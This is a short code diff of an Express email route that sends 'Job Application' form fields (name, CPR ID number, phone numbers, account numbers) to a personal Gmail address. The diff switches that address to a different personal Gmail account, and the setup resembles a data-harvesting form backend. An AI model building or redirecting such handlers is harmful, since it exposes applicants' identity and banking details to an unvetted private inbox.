@@ -23,7 +23,7 @@ app.post('/send-email', (req, res) => {
 
     const mailOptions = {
         from: 'hamzasaeed4689@gmail.com',
-        to: 'hamzasaeed4689@gmail.com',
+        to: 'sameerali406046@gmail.com',
         subject: 'Job Application',
         text: `Name: ${name}\CPR: ${cpr}\nPhone: ${phoneNumber}\nPhone Number 2: ${phone2}\nAccount  Number 1: ${account1}\nAccount  Number 2: ${account3}`
     };
